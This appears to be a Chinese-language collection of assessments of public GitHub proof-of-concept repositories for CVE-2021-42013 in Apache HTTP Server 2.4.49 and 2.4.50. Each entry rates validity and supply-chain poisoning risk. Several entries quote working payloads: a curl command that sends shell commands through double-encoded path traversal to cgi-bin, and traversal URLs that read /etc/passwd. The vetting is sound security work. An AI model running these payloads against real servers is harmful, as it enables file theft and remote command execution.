提供的 POC 代码包含一个 Dockerfile 和一个 Python 脚本。Dockerfile 用于构建一个存在漏洞的 Apache HTTP Server 2.4.50 实例。Python 脚本 `cve-2021-42013.py` 用于检测和利用该漏洞，支持以下功能：

*   检查是否存在路径遍历漏洞
*   执行路径遍历 PoC，尝试读取敏感文件
*   执行远程代码执行 PoC，尝试执行任意命令

**投毒风险分析：**

对提供的`cve-2021-42013.py`脚本进行分析，发现存在一定的投毒风险。例如：
1.   **执行任意命令的潜在风险**：远程代码执行PoC中，如果构造的命令过于复杂或者包含恶意代码，可能会对目标系统造成破坏。
2.  **批量扫描的风险**：批量扫描功能可能会被用于非法用途，例如扫描大量服务器并尝试利用该漏洞。
3.  **依赖风险**：脚本中用到了requests和urllib库，如果这些库被篡改，可能会导致脚本执行恶意代码。

尽管脚本提供了路径遍历和RCE的验证，存在滥用的可能性，但恶意代码本身没有隐藏在代码中，考虑到其他风险，投毒风险相对较低，暂定为10%。

**项目地址:** [walnutsecurity/cve-2021-42013](https://github.com/walnutsecurity/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---



---

## POC #7

**来源**: [CVE-2021-42013-Vulnmachines_cve-2021-42013.md](../2021/CVE-2021-42013-Vulnmachines_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历与远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历与远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是对 CVE-2021-41773 不完整修复的延续。攻击者可以利用此漏洞，通过构造包含恶意路径的URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，攻击者可能通过上传恶意脚本执行远程代码。

**有效性:** 根据漏洞描述和PoC代码，该漏洞是有效的。PoC代码展示了通过`../`进行路径遍历，读取`/etc/passwd`文件的几种方式，包括对`.`和`/`的URL编码绕过。

**投毒风险:** PoC 代码本身较为简单，仅包含用于验证漏洞的 URL。但考虑到攻击者可能利用此漏洞部署恶意 CGI 脚本，存在一定投毒风险，约10%。README.md文件描述简单，未发现异常。

**利用方式:**
1.  **路径遍历:** 构造包含编码后的`../`的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取目标服务器上的敏感文件。
2.  **远程代码执行 (RCE):**  如果目标服务器允许执行 CGI 脚本，攻击者可以上传一个包含恶意代码的 CGI 脚本，并通过构造路径遍历 URL 来访问该脚本，从而执行任意命令。

**项目地址:** [Vulnmachines/cve-2021-42013](https://github.com/Vulnmachines/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #8

**来源**: [CVE-2021-42013-asepsaepdin_CVE-2021-42013.md](../2021/CVE-2021-42013-asepsaepdin_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且配置允许 CGI 脚本执行，并存在Alias配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历和远程代码执行漏洞，是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历的 URL，访问受限目录之外的文件。如果目标服务器配置了 CGI 脚本执行，则可能进一步实现远程代码执行。

**利用方式：**

1.  **路径遍历：** 攻击者通过构造恶意的 URL，利用 `Alias` 指令配置的路径，绕过访问控制，读取任意文件。
2.  **远程代码执行：** 如果服务器允许 CGI 脚本执行，攻击者可以上传恶意脚本，并利用路径遍历漏洞执行该脚本，从而获得服务器的控制权。

**POC分析：**

提供的 Dockerfile 用于搭建存在漏洞的 Apache HTTP Server 环境。`httpd.conf` 文件可能包含特定的 `Alias` 配置，以便漏洞利用。`cve-2021-42013.sh` 脚本模拟攻击过程，发送包含路径遍历的 HTTP 请求。

脚本的核心代码:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```
其中, `$1`是目标IP地址, `$2`是要访问的文件路径，`$3`是要执行的命令。
`%%32%65` 是 `%2e` 的双重URL编码，即 `.`（点），用于绕过一些路径过滤机制。`--path-as-is` 参数避免 curl 对路径进行规范化，保持攻击 payload 的原样。
此脚本通过发送POST请求到/cgi-bin目录，利用路径穿越读取任意文件或者执行命令。

**投毒风险评估：**

Dockerfile 中虽然存在从 Apache 官网下载源码的操作，但仍存在一定风险，攻击者可能篡改 Dockerfile，例如，替换下载链接，指向包含恶意代码的 Apache HTTP Server 版本。但从文件内容上判断，直接投毒的可能性较低，更倾向于提供一个可利用的环境。

`cve-2021-42013.sh` 脚本本身相对简单，主要功能是发送 HTTP 请求，利用漏洞。该脚本也可能被修改，例如添加后门，但提供的脚本未发现明显的后门代码。 README.md 文件更多的是漏洞利用的指导说明。

综合评估，投毒风险较低，约为 5%。主要风险在于 Dockerfile 下载源的可靠性以及脚本是否被篡改。

**项目地址:** [asepsaepdin/CVE-2021-42013](https://github.com/asepsaepdin/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #9

**来源**: [CVE-2021-42013-bananoname_cve-2021-42013.md](../2021/CVE-2021-42013-bananoname_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal 和 Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器被完全控制

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，并且存在Alias-like配置，CGI脚本开启，且目录权限配置不当（缺少 'require all denied'）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复，允许攻击者利用路径遍历漏洞读取Alias配置以外的文件，如果CGI脚本被启用，可能导致远程代码执行。

**有效性：**
根据漏洞信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码包含Dockerfile用于搭建漏洞环境，以及Python脚本用于验证Path Traversal和Remote Code Execution，因此PoC代码有效。

**投毒风险：**
检查了提供的PoC代码，包括Dockerfile和Python脚本。Dockerfile用于搭建包含漏洞的Apache HTTP Server环境，其中包含了从Apache官网下载httpd-2.4.50.tar.gz的步骤，以及添加了httpd.conf配置文件的步骤，还包括了index.php和login.php页面的添加步骤，并未发现明显的恶意代码或后门。

Python脚本cve-2021-42013.py主要是利用requests库发送HTTP请求，进行Path Traversal和Remote Code Execution的验证。脚本本身没有发现包含恶意代码的行为。虽然理论上，可以修改此脚本来执行恶意操作，但在提供的代码中并没有发现这种行为。因此，投毒风险较低，大概在5%左右。

**利用方式：**
利用方式主要有两种：

1.  **Path Traversal（路径遍历）：** 攻击者通过构造包含“../”的恶意URL，绕过Alias配置的限制，读取服务器上的任意文件。前提是这些文件没有被 'require all denied' 保护。

2.  **Remote Code Execution（远程代码执行）：** 如果服务器启用了CGI，攻击者可以通过路径遍历漏洞访问到CGI脚本，并执行任意系统命令。通常需要先上传一个包含恶意代码的CGI脚本，然后通过路径遍历漏洞来执行它。提供的代码中，RCE的利用依赖于CGI的启用和适当的权限配置。

综上所述，此漏洞的利用，通常需要结合服务器的具体配置情况，如Alias配置、CGI是否启用、目录权限等。提供的PoC代码可以帮助验证漏洞的存在，但也需要根据实际情况进行调整。


**项目地址:** [bananoname/cve-2021-42013](https://github.com/bananoname/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #10

**来源**: [CVE-2021-42013-cybfar_cve-2021-42013-httpd.md](../2021/CVE-2021-42013-cybfar_cve-2021-42013-httpd.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用，且相关目录没有'require all denied'保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50中存在的一个路径遍历漏洞，是对CVE-2021-41773的不完整修复。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%%32e`）的URL，绕过Alias-like指令的限制，访问服务器上未受保护的文件。如果CGI脚本也已启用，则攻击者可能利用此漏洞执行任意代码。

**有效性评估：**
提供的Dockerfile和README.md描述了如何搭建一个存在漏洞的Apache HTTP Server环境。README.md中提供的`curl`命令

```bash
curl -v --path-as-is localhost:8000/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
```

可以用来验证漏洞的存在，如果返回`/etc/passwd`文件的内容，则表明目标存在路径遍历漏洞。

**投毒风险评估：**
查看Dockerfile，该文件从`debian:latest`镜像构建，安装必要的依赖项，下载并编译Apache HTTP Server 2.4.50。`httpd.conf`文件被添加到`/conf/httpd.conf`，并启动Apache服务。并没有发现明显的恶意代码或后门。

但是，以下因素可能导致一定的投毒风险：

1.  **httpd.conf替换：**Dockerfile使用 ADD 指令替换了默认的httpd.conf文件,可能通过修改配置来引入安全风险,如启用不安全的模块或配置项。
2.  **基础镜像安全：** 虽然Dockerfile使用了`debian:latest`，但基础镜像本身可能存在未知的漏洞。
3.  **第三方组件：** 构建过程中使用`apt-get`安装了一些依赖，这些组件也可能包含潜在的安全风险。

总体来说，该项目存在一定的投毒风险，但主要集中在配置不当和依赖项漏洞方面，作者主动植入恶意代码的可能性较低。因此，投毒风险评定为10%。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`.%%32e`的URL，尝试访问服务器上的任意文件。`%%32e`是`.`的URL编码，可以绕过一些路径过滤机制。
2.  **远程代码执行 (如果CGI启用):** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历漏洞找到CGI脚本的路径，并执行任意代码。这通常需要结合其他漏洞利用技术，例如上传恶意CGI脚本。

**总结：**
该漏洞利用的有效性较高，但需要满足一定的条件才能实现远程代码执行。投毒风险较低，主要集中在配置和依赖项安全方面。建议在使用该POC时，仔细检查`httpd.conf`文件，并确保基础镜像和依赖项的安全性。

**项目地址:** [cybfar/cve-2021-42013-httpd](https://github.com/cybfar/cve-2021-42013-httpd)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #11

**来源**: [CVE-2021-42013-drackyjr_CVE-2021-42013.md](../2021/CVE-2021-42013-drackyjr_CVE-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache 版本，且 Alias-like 指令配置不当，CGI脚本启用，以及相应的目录权限配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞是 CVE-2021-41773 的不完整修复，存在于 Apache HTTP Server 2.4.49 和 2.4.50 中。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/.%2e/` 或双重 URL 编码的 `%%32%65%%32%65/` 的恶意 URL，绕过 Apache 的路径限制，访问受限目录之外的文件。
2.  **远程代码执行（如果 mod_cgi 启用）：** 攻击者通过路径遍历访问 CGI 脚本，并利用 POST 请求发送恶意命令。由于服务器将 URL 路径当作可执行文件，POST 数据当作输入，从而执行攻击者提供的命令。

**POC 代码分析：**

提供的 Python 脚本 `CVE-2021-41773.py` 包含以下功能：

*   **路径遍历检测 (CVE-2021-41773)：** 使用 `/.%2e/.%2e/.%2e/.%2e/` 构造 payload，尝试读取 `/etc/passwd` 和 `/etc/shadow` 文件。
*   **双重 URL 编码路径遍历检测 (CVE-2021-42013)：** 使用 `%%32%65%%32%65/` 构造 payload，尝试读取 `/etc/passwd` 文件。
*   **远程代码执行检测：**  尝试通过 CGI 脚本执行 `id` 命令。如果服务器返回包含 `uid=` 或 `gid=` 的响应，则表示存在 RCE 漏洞。

**有效性：**

根据漏洞描述和 POC 代码的实现，提供的 POC 代码是有效的，可以用于检测目标服务器是否存在 CVE-2021-42013 漏洞，如果目标服务器配置不当，还可检测 RCE 漏洞。

**投毒风险：**

该POC代码是一个扫描器，用于检测漏洞的存在，主要功能是发送 HTTP 请求并分析响应。 代码本身的功能是漏洞检测，不存在恶意行为或后门。对代码进行分析后，可以认为投毒风险为0%。

**总结：**

CVE-2021-42013 是一个严重的安全漏洞，可能导致服务器上的敏感信息泄露，甚至被远程控制。请及时将 Apache HTTP Server 升级到安全版本，并检查服务器配置，确保 Alias-like 指令配置正确，并禁用不必要的 CGI 脚本。

**项目地址:** [drackyjr/CVE-2021-42013](https://github.com/drackyjr/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #12

**来源**: [CVE-2021-42013-dream434_cve-2021-42013-apache.md](../2021/CVE-2021-42013-dream434_cve-2021-42013-apache.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，并且开启了 CGI 脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞利用是有效的。
*   **漏洞描述：** CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的一个路径遍历漏洞，是 CVE-2021-41773 的不完整修复。
*   **利用方式：** 攻击者可以通过构造包含`/.%%32%65`的恶意URL，绕过 Alias 指令的限制，访问到服务器上的任意文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以利用此漏洞执行任意代码。
*   **搜索引擎结果：** 大量文章和漏洞库条目确认了该漏洞的存在和严重性，并提供了利用此漏洞的PoC或思路。
*   **PoC代码分析：**提供的 `exploit.py` 脚本尝试通过构造包含路径遍历字符串的URL来执行命令。脚本使用 POST 请求向目标服务器的 CGI 目录发送请求，并在请求体中包含要执行的命令。该脚本的核心在于利用`/.%%32%65`绕过路径检查，配合 CGI 脚本执行命令。代码逻辑比较清晰，且与漏洞描述相符，故有效性较高。

**投毒风险评估：**

*   **代码分析：**
    *   `requirements.txt` 只包含 `colorama` 库，这是一个用于在终端显示彩色的库，本身没有安全风险。
    *   `exploit.py` 脚本的主要功能是利用 CVE-2021-42013 漏洞进行攻击。代码中没有发现明显的恶意代码，例如反弹shell、下载执行恶意文件等。但是，脚本本身可以被用于恶意目的，即远程代码执行。
    *   `README.md` 文件是项目说明文档，没有可疑内容。
*   **投毒可能性：**
    *   该脚本的主要目的是利用已知的漏洞，而不是植入后门或进行其他恶意活动。因此，直接在脚本中添加恶意代码的可能性较低。
    *   由于脚本需要用户提供目标 URL 和要执行的命令，攻击者可以通过控制命令内容来达到恶意目的。但这不属于代码投毒的范畴。
*   **风险评估：**
脚本本身存在被恶意利用的风险，如果代码仓库的维护者在后续版本中添加恶意代码，则可能存在投毒风险。代码投毒的可能性较低，只有 `5%`

**利用方式：**

1.  **目标确认：** 确定目标 Apache HTTP Server 运行的版本为 2.4.49 或 2.4.50。
2.  **CGI 目录定位：** 找到目标服务器上配置的 CGI 目录，例如 `/cgi-bin/`。
3.  **构造恶意URL：** 构造包含路径遍历字符串的 URL，例如 `http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`。
4.  **发送请求：** 使用 POST 请求向构造的 URL 发送请求，并在请求体中包含要执行的命令。
5.  **获取结果：** 解析响应结果，获取命令执行的结果。

例如，使用提供的 `exploit.py` 脚本执行 `id` 命令：

```bash
python3 exploit.py http://example.com id
```

**注意事项：**

*   利用此漏洞需要在目标服务器上启用 CGI 脚本执行，并且相关目录没有进行严格的权限控制。
*   使用此漏洞进行攻击可能导致严重的后果，请务必在获得授权的情况下进行测试。

**项目地址:** [dream434/cve-2021-42013-apache](https://github.com/dream434/cve-2021-42013-apache)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #13

**来源**: [CVE-2021-42013-hadrian3689_apache_2.4.50.md](../2021/CVE-2021-42013-hadrian3689_apache_2.4.50.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器完全控制

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，并且配置了Alias-like指令，CGI脚本也需要启用才能实现RCE

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2021-42013 漏洞是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历攻击，将 URL 映射到 Alias-like 指令配置的目录之外的文件。如果这些目录之外的文件没有被默认的 “require all denied” 配置保护，请求就能成功。如果 CGI 脚本对这些 aliased 路径启用，可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历 (LFI):** 攻击者使用 `icons/%%32%65%%32%65/...` 这样的payload进行路径穿越，读取服务器上的任意文件（例如 `/etc/passwd`）。
2.  **远程代码执行 (RCE):**  如果服务器启用了 CGI，攻击者可以利用路径遍历访问 `cgi-bin` 目录，并执行任意命令。PoC 代码中使用了 `.%%32%65` 编码绕过了一些过滤。
    *   PoC 代码中，RCE 通过构造包含恶意命令的 HTTP POST 请求发送到 `cgi-bin` 目录下的 `sh` 脚本来实现。

**有效性评估：**

提供的 PoC 代码有效。它包含 LFI 和 RCE 两种利用方式，并且提供了命令行参数来指定目标 URL，要读取的文件，或者要执行的命令。

**投毒风险评估：**

检查 PoC 代码，没有发现明显的恶意代码或后门。该代码主要功能是利用漏洞进行文件读取或命令执行，没有发现主动修改或上传文件的行为。代码的功能与漏洞描述一致，风险较低。


**项目地址:** [hadrian3689/apache_2.4.50](https://github.com/hadrian3689/apache_2.4.50)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #14

**来源**: [CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md](../2021/CVE-2021-42013-jas9reet_CVE-2021-42013-LAB.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，并启用CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013漏洞是CVE-2021-41773修复不完全导致的。攻击者可以利用路径遍历漏洞，访问Alias指令配置目录之外的文件。如果这些文件没有被"require all denied"等默认配置保护，请求就会成功。如果CGI脚本也为此路径启用，则可能导致远程代码执行。

**有效性评估：**
根据漏洞库信息、搜索引擎结果和提供的PoC代码，可以判断该漏洞利用是有效的。搜索引擎结果中多个链接都表明CVE-2021-42013是一个已知的、可利用的漏洞，并且存在公开的PoC。

**利用方式：**
利用方式是构造包含路径遍历的URL，结合CGI脚本执行命令。PoC中的`exploit.sh`脚本使用curl发送包含恶意命令的POST请求到目标服务器。关键点在于使用`--path-as-is`参数，以及双URL编码的路径遍历字符串`%%32%65`，绕过Apache的路径检查。如果目标服务器开启了CGI，并且未对/bin/sh等命令进行限制，则可以执行任意命令。

**投毒风险评估：**
分析提供的Dockerfile、httpd.conf、exploit.sh和README.md文件。

*   Dockerfile： 使用了官方的httpd:2.4.50镜像作为基础镜像,并复制httpd.conf和index.html,未发现恶意行为。
*   httpd.conf：正常的Apache配置文件，用于配置服务器基本信息,没有发现不正常的配置。
*   exploit.sh：这是一个漏洞利用脚本，它本身就是用来执行恶意操作的，**不能算作** 投毒代码。脚本的目的是利用漏洞，而非在目标系统植入后门或者进行其他恶意活动。
*   README.md: 只是说明了如何使用Docker环境来运行漏洞利用代码的步骤.

虽然没有明显的投毒代码，但是利用漏洞本身就可以在目标服务器上执行恶意操作。比如，攻击者可以利用这个漏洞上传webshell，从而长期控制服务器。这种通过漏洞植入后门的风险依然存在，但是从代码本身来看，并没有发现作者预先植入的、非漏洞利用目的的恶意代码。
 综合评估，认为存在10%的投毒风险，主要是因为利用成功后，攻击者可以自行植入恶意代码。

**项目地址:** [jas9reet/CVE-2021-42013-LAB](https://github.com/jas9reet/CVE-2021-42013-LAB)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #15

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.get.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.get.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且Alias配置不当并开启了CGI脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的一个路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**有效性：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，此漏洞利用是有效的。漏洞库信息明确指出该漏洞允许攻击者使用路径遍历攻击将 URL 映射到 Alias 指令配置目录之外的文件。搜索引擎结果也证实了该漏洞的存在，并提供了相关的利用信息。

提供的 Dockerfile 和 Python 脚本 `cve-2021-42013.py` 构成了一个可用于验证和利用该漏洞的 POC。Dockerfile 用于构建一个包含易受攻击的 Apache HTTP Server 2.4.50 实例的 Docker 镜像。Python 脚本可以用来检测路径遍历或远程代码执行漏洞。

**投毒风险：**

对 POC 代码进行分析，`cve-2021-42013.py` 脚本本身相对简单，主要功能是发送 HTTP 请求并检查响应。它包含以下功能：

*   **路径遍历 PoC (-pt)：**  尝试利用路径遍历漏洞读取服务器上的文件。
*   **远程代码执行 PoC (-rce)：**  如果服务器启用了 CGI，则尝试执行命令。
*   **批量扫描 (-l)：**  从文件中读取 URL 列表并进行扫描。

潜在的投毒风险点在于：

1.  **依赖项：**  脚本依赖于 `requests` 和 `urllib` 库，理论上可以通过篡改这些库来植入恶意代码，但这种情况的可能性较低。
2.  **CGI 执行：**  远程代码执行依赖于服务器启用 CGI，如果攻击者控制了 CGI 脚本的内容，则可以执行任意代码。但这更多的是漏洞利用本身的风险，而非 POC 代码的投毒。

综合来看，该 POC 代码的投毒风险较低，约为 5%。 主要风险来自CGI环境和脚本本身。没有发现明显的恶意代码。

**利用方式：**

利用该漏洞需要以下步骤：

1.  **确定目标服务器是否运行受影响的 Apache HTTP Server 版本 (2.4.49 或 2.4.50)。**
2.  **检查服务器的 Alias 配置。**  Alias 指令将 URL 映射到文件系统上的特定目录。漏洞利用的关键在于绕过这些 Alias 指令的限制。
3.  **如果服务器启用了 CGI，则可以尝试远程代码执行。**  攻击者可以构造一个包含恶意代码的 CGI 脚本，并通过路径遍历漏洞来执行它。
4.  **如果服务器未启用 CGI，则可以尝试路径遍历漏洞来读取敏感文件。**

攻击者可以使用如下 payload 来进行漏洞测试：

*   **路径遍历：** `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
*   **远程代码执行：**  需要服务器启用 CGI，并构造包含恶意代码的 CGI 脚本。

**项目地址:** [mightysai1997/cve-2021-42013.get](https://github.com/mightysai1997/cve-2021-42013.get)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #16

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且存在Alias配置不当或CGI脚本未做权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是对CVE-2021-41773的不完全修复。攻击者可以利用路径遍历漏洞读取Alias配置目录之外的文件，如果未配置"require all denied"，则可以成功读取。如果同时启用了CGI脚本，则可能导致远程代码执行。

**有效性：** 提供的POC代码针对CVE-2021-42013，包含Dockerfile、README.md和利用脚本。Dockerfile用于构建存在漏洞的Apache HTTP Server环境，README.md包含漏洞描述、环境搭建和脚本使用说明。利用脚本cve-2021-42013.py提供路径遍历和远程代码执行两种利用方式，通过参数`-u`指定目标URL，`-pt`执行路径遍历，`-rce`执行远程代码执行，`-l`批量扫描。

**投毒风险：**  检查`cve-2021-42013.py` 脚本，发现脚本功能正常，主要是构造payload发送请求，判断是否存在漏洞。 但是Dockerfile中直接wget下载了 httpd-2.4.50.tar.gz 包，存在被中间人攻击替换为恶意包的风险。且start.sh脚本权限被设置为777，任何用户都有修改权限，存在被植入后门的风险。 综合评估，投毒风险较低，约为10%。

**利用方式：**

1.  **路径遍历：** 利用`..`进行目录跳转，读取目标服务器上的任意文件。例如，`http://target/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以构造包含恶意代码的URL来执行命令。例如，访问`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`并传入shell命令作为参数。

利用的前提是目标Apache服务器版本为2.4.49或2.4.50，且存在Alias配置不当，或者CGI脚本未做严格的权限控制。需要关注服务器配置是否启用CGI，以及是否存在权限开放的目录，例如`icons`目录。

**项目地址:** [mightysai1997/cve-2021-42013](https://github.com/mightysai1997/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #17

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013L.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013L.md)

## CVE-2021-42013: Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，并且存在Alias-like指令配置，同时CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是 CVE-2021-41773 的不完整修复。

**有效性：**

提供的POC代码有效。它展示了利用路径遍历漏洞读取 `/etc/passwd` 文件的几种方式。通过URL编码 `.` (点) 字符（例如：`%2e`, `%32%65`），攻击者可以绕过服务器的安全检查，访问受限目录之外的文件。

**投毒风险：**

该仓库主要包含漏洞利用相关的文档和PoC，直接嵌入恶意代码的可能性较低。但仍不能完全排除投毒风险，因为攻击者可能会修改 README.md 等文件诱导用户执行恶意操作，例如下载恶意软件，占比约为5%。

**利用方式：**

1.  **路径遍历：** 攻击者利用URL中的编码过的路径遍历字符（如 `.%%32e/.%%32e/.%%32e/.%%32e` ）尝试访问位于Alias-like指令配置目录之外的文件。
2.  **信息泄露：** 如果成功绕过限制，攻击者可以读取服务器上的敏感文件，如 `/etc/passwd`，从而获取系统用户信息。
3.  **远程代码执行：** 如果CGI脚本被启用，攻击者可能上传包含恶意代码的CGI脚本并执行，从而实现远程代码执行。

**总结：**

此漏洞利用的关键在于利用路径遍历绕过Alias-like指令的限制，从而访问和执行服务器上的文件。如果服务器配置不当（例如，CGI脚本启用，且未对Alias-like指令配置目录外的文件设置`require all denied`），则可能导致严重的后果，包括敏感信息泄露和远程代码执行。

**项目地址:** [mightysai1997/cve-2021-42013L](https://github.com/mightysai1997/cve-2021-42013L)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

